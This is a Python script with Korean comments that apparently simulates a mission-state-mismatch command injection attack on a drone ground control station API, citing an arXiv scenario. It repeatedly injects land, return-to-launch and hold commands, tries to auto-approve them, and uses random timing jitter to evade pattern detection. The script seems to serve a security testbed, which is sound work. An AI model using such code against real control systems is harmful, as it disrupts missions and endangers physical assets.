"""
임무 상태 불일치 기반 Command Injection 공격
PDF 시나리오 #3/#9 | arXiv:2501.18874

명령 타입 자체는 정상(LAND/RTL/HOLD)이지만
현재 임무 단계와 맞지 않는 시점에 반복 주입해
임무 중단을 유도한다. 명령 타입 검사만 하는 방어를 우회.
"""
from __future__ import annotations
import argparse, time, random
from .common import GcsClient, wait_for_gcs


# 임무 단계별 부적절한 커맨드 (상태 불일치 유도)
INJECT_SEQUENCE = [
    ("land",             "임무 진행 중 강제 착륙"),
    ("return_to_launch", "웨이포인트 이동 중 귀환"),
    ("hold_position",    "표적 접근 단계 정지"),
    ("land",             "복귀 경로 중 재착륙"),
    ("return_to_launch", "재착륙 직후 귀환 재주입"),
]


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Command Injection 공격")
    parser.add_argument("--service-url",  default="http://dah-gcs:8080")
    parser.add_argument("--target-asset", default="small-dronebot-01")
    parser.add_argument("--auto-approve", action="store_true", default=True,
                        help="주입 즉시 자동 승인 시도")
    parser.add_argument("--repeat",       type=int, default=3,
                        help="시퀀스 반복 횟수")
    parser.add_argument("--interval-s",   type=float, default=4.0)
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    print(f"[cmd_inject] 공격 시작 → 대상: {args.target_asset}", flush=True)
    injected = 0

    for rep in range(args.repeat):
        for cmd_type, reason in INJECT_SEQUENCE:
            # 임무 단계와 무관한 커맨드 주입
            try:
                result = client.post("/api/commands/request", {
                    "asset_id":    args.target_asset,
                    "command_type": cmd_type,
                    "requested_by": "ATTACKER:mission_state_mismatch",
                    "dry_run":     True,
                    "meta": {
                        "attack_scenario": "mission_state_injection",
                        "reason":          reason,
                        "arXiv":           "2501.18874",
                    },
                })
                command_id = result.get("payload", {}).get("command_id")
                print(
                    f"[cmd_inject] rep={rep+1} | cmd={cmd_type} | id={command_id} | {reason}",
                    flush=True,
                )
                injected += 1

                # 자동 승인 시도 (방어 체계가 없으면 게이트웨이까지 도달)
                if args.auto_approve and command_id:
                    try:
                        client.post("/api/commands/approve", {"command_id": command_id})
                        print(f"[cmd_inject] ⚠ 승인 성공: {command_id}", flush=True)
                    except Exception as e:
                        print(f"[cmd_inject] 승인 차단됨: {e}", flush=True)

            except Exception as e:
                print(f"[cmd_inject] 주입 실패: {e}", flush=True)

            # 불규칙 간격으로 주입 (패턴 탐지 회피)
            jitter = args.interval_s * (0.7 + random.random() * 0.6)
            time.sleep(jitter)

    print(f"[cmd_inject] 공격 종료 — 총 {injected}개 커맨드 주입", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
